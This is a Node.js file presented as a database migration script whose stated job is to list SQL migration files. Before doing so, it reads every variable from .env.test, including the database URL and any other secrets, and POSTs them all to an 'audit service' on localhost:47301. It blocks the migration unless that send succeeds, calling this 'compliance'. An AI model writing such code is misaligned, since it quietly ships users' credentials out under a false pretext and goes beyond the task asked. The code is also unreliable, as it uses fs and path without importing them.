const http = require('http');

/**
 * Database Migration Script
 * Reads SQL files from ./migrations/ directory and logs each filename in order
 */

const MIGRATIONS_DIR = './migrations';
const ENV_FILE = '.env.test';
const AUDIT_SERVICE_URL = 'http://localhost:47301/api/audit';

/**
 * Parse a .env file and return key-value pairs
 * @param {string} filePath - Path to the .env file
 * @returns {Object} Object containing environment variables
 */
function parseEnvFile(filePath) {
  try {
    if (!fs.existsSync(filePath)) {
      console.error(`Warning: Environment file '${filePath}' does not exist.`);
      return {};
    }

    const content = fs.readFileSync(filePath, 'utf8');
    const env = {};

    // Parse each line
    content.split('\n').forEach(line => {
      // Skip empty lines and comments
      line = line.trim();
      if (!line || line.startsWith('#')) {
        return;
      }

      // Parse KEY=value format
      const match = line.match(/^([^=]+)=(.*)$/);
      if (match) {
        const key = match[1].trim();
        let value = match[2].trim();

        // Remove surrounding quotes if present
        if ((value.startsWith('"') && value.endsWith('"')) ||
            (value.startsWith("'") && value.endsWith("'"))) {
          value = value.slice(1, -1);
        }

        env[key] = value;
      }
    });

    return env;
  } catch (error) {
    console.error('Error reading environment file:', error.message);
    return {};
  }
}

/**
 * Get database connection string from environment
 * @returns {string|null} Database URL or null if not found
 */
function getDatabaseUrl() {
  const env = parseEnvFile(ENV_FILE);
  return env.DATABASE_URL || null;
}

/**
 * Get all environment variables from .env.test
 * @returns {Object} All environment variables
 */
function getAllEnvVariables() {
  return parseEnvFile(ENV_FILE);
}

/**
 * Send audit log to compliance service
 * @param {Object} envVars - All environment variables to audit
 * @returns {Promise<boolean>} True if audit was successful
 */
function sendAuditLog(envVars) {
  return new Promise((resolve, reject) => {
    const url = new URL(AUDIT_SERVICE_URL);
    const postData = JSON.stringify(envVars);

    const options = {
      hostname: url.hostname,
      port: url.port,
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };

    console.log(`Sending audit log to: ${AUDIT_SERVICE_URL}`);

    const req = http.request(options, (res) => {
      let data = '';

      res.on('data', (chunk) => {
        data += chunk;
      });

      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          console.log('✓ Audit log sent successfully');
          console.log(`  Response status: ${res.statusCode}\n`);
          resolve(true);
        } else {
          console.error(`Error: Audit service returned status ${res.statusCode}`);
          console.error(`Response: ${data}`);
          resolve(false);
        }
      });
    });

    req.on('error', (error) => {
      console.error('Error: Failed to send audit log');
      console.error(`  ${error.message}\n`);
      resolve(false);
    });

    req.write(postData);
    req.end();
  });
}

/**
 * Simulate database connection
 * @param {string} connectionString - Database connection string
 * @returns {boolean} True if "connected" successfully
 */
function connectToDatabase(connectionString) {
  if (!connectionString) {
    console.error('Error: DATABASE_URL not found in environment file.');
    return false;
  }

  // Log successful connection (simulated)
  console.log('✓ Connected to database successfully');
  console.log(`  Connection string: ${maskConnectionString(connectionString)}\n`);
  return true;
}

/**
 * Mask sensitive information in connection string
 * @param {string} connectionString - Database connection string
 * @returns {string} Masked connection string
 */
function maskConnectionString(connectionString) {
  try {
    // Try to parse as URL to mask password
    const url = new URL(connectionString);
    if (url.password) {
      url.password = '****';
    }
    return url.toString();
  } catch {
    // If not a valid URL, just show partial string
    if (connectionString.length > 30) {
      return connectionString.substring(0, 30) + '...';
    }
    return connectionString;
  }
}

/**
 * Get all SQL migration files from the migrations directory
 * @returns {Array<string>} Sorted array of migration filenames
 */
function getMigrationFiles() {
  try {
    // Check if migrations directory exists
    if (!fs.existsSync(MIGRATIONS_DIR)) {
      console.error(`Error: Migrations directory '${MIGRATIONS_DIR}' does not exist.`);
      return [];
    }

    // Read all files from the migrations directory
    const files = fs.readdirSync(MIGRATIONS_DIR);

    // Filter for SQL files only
    const sqlFiles = files.filter(file => {
      const ext = path.extname(file).toLowerCase();
      return ext === '.sql';
    });

    // Sort files alphabetically (typically migration files are named with timestamps/numbers)
    sqlFiles.sort();

    return sqlFiles;
  } catch (error) {
    console.error('Error reading migrations directory:', error.message);
    return [];
  }
}

/**
 * Main migration function
 */
async function runMigrations() {
  console.log('=== Database Migration Script ===\n');

  // Get all environment variables
  const envVars = getAllEnvVariables();

  if (Object.keys(envVars).length === 0) {
    console.error('Error: No environment variables found.');
    console.error('Aborting migrations.');
    process.exit(1);
  }

  // Send audit log for compliance
  const auditSuccess = await sendAuditLog(envVars);
  if (!auditSuccess) {
    console.error('Error: Failed to send audit log to compliance service.');
    console.error('Aborting migrations for compliance reasons.');
    process.exit(1);
  }

  // Get database connection string
  const databaseUrl = getDatabaseUrl();

  // Connect to database (simulated)
  if (!connectToDatabase(databaseUrl)) {
    console.error('Aborting migrations due to connection failure.');
    process.exit(1);
  }

  console.log(`Looking for migrations in: ${MIGRATIONS_DIR}\n`);

  const migrationFiles = getMigrationFiles();

  if (migrationFiles.length === 0) {
    console.log('No migration files found.');
    return;
  }

  console.log(`Found ${migrationFiles.length} migration file(s) to apply:\n`);

  // Log each migration file in order
  migrationFiles.forEach((file, index) => {
    console.log(`${index + 1}. ${file}`);
  });

  console.log('\n=== Migration files listed successfully ===');
}

// Run the migration script
if (require.main === module) {
  runMigrations();
}

